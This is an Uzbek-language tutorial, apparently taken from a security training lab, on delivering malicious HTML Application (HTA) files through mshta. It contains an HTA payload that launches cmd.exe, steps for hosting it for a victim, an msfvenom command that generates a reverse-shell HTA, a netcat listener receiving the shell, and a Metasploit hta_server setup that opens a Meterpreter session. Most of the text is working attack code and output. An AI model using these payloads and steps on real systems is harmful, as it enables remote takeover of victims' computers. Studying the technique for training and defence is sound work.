
## HTML Application (HTA)

HTA — bu **"HTML Application"** so‘zining qisqartmasi. U yuklab olinadigan va o‘z ichiga butun ko‘rinish va render qilish ma’lumotlarini oladigan fayl yaratishga imkon beradi. HTML Applications (HTA) — bu dinamik HTML sahifalar bo‘lib, ularda **JScript** va **VBScript** ishlatiladi.

**LOLBINS** (Living-off-the-land Binaries) vositasi bo‘lgan `mshta` HTA fayllarini ishga tushirish uchun ishlatiladi. U o‘zi yoki Internet Explorer orqali avtomatik ishga tushirilishi mumkin.

Quyidagi misolda biz **ActiveXObject** dan foydalanib, **cmd.exe** ni ishga tushiradigan payload yaratamiz.

```html
<html>
<body>
<script>
    var c = 'cmd.exe'
    new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

Keyin, `payload.hta` faylini web-server orqali taqdim etamiz. Buni hujumchi mashinasida quyidagicha bajarish mumkin:

**Terminal:**

```bash
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```

Jabrlanuvchi kompyuterida Microsoft Edge orqali quyidagi havolaga kiriladi:

```
http://10.8.232.37:8090/payload.hta
```

(E’tibor bering, `10.8.232.37` — bu AttackBox’ning IP manzili.)

**Run** tugmasini bosganimizda, `payload.hta` ishga tushadi va **cmd.exe** chaqiriladi. Quyidagi rasmda bu muvaffaqiyatli ishlagani ko‘rsatilgan.

---

## HTA orqali teskari ulanish (Reverse Connection)

Quyidagi kabi teskari shell payloadini yaratishimiz mumkin:

**Terminal:**

```bash
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
```

* `LHOST` — bizning IP manzilimiz
* `LPORT` — tinglaydigan port
* `-f hta-psh` — HTA (PowerShell) formatida yaratish
* `-o thm.hta` — saqlash nomi

**msfvenom** — bu Metasploit Framework’ning zararli payload generatori. Biz **windows/x64/shell\_reverse\_tcp** payloadini ishlatib, Windows mashinasidan o‘zimizga teskari ulanish olishga tayyorlaymiz.

Hujumchi mashinasida port 443 ni tinglash kerak bo‘ladi (root huquqi talab qilinadi, yoki boshqa port ishlatilishi mumkin):

**Terminal:**

```bash
user@machine$ sudo nc -lvp 443
listening on [any] 443 ...
10.8.232.37: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads>ipconfig
```

Natijada, jabrlanuvchi bizning serverimizga ulanadi va buyruqlarni bajarish imkoniga ega bo‘lamiz.

---

## Metasploit orqali zararli HTA yaratish

Boshqa usul — Metasploit Framework’dan foydalanish. Avval `msfconsole -q` buyrug‘i bilan Metasploit’ni ishga tushiramiz. Keyin **exploit/windows/misc/hta\_server** modulidan foydalanamiz.

**Terminal:**

```bash
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
```

Metasploit bizga HTA fayl uchun URL beradi:

```
http://10.8.232.37:8080/TkWV9zkd.hta
```

Jabrlanuvchi bu havolaga kirganda va **Run** bosganda, bizga **Meterpreter** sessiyasi ochiladi:

**Terminal:**

```
[*] 10.10.201.254    hta_server - Delivering Payload
[*] Sending stage (175174 bytes) to 10.10.201.254
[*] Meterpreter session 1 opened (10.8.232.37:443 -> 10.10.201.254:61629)
```

Keyin sessiyaga ulanib, tizim haqida ma’lumot olamiz:

```
meterpreter > sysinfo
Computer        : DESKTOP-1AU6NT4
OS              : Windows 10 (10.0 Build 14393)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
```

Shuningdek, oddiy Windows shell’iga ham o‘tish mumkin:

```
meterpreter > shell
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\app>
```
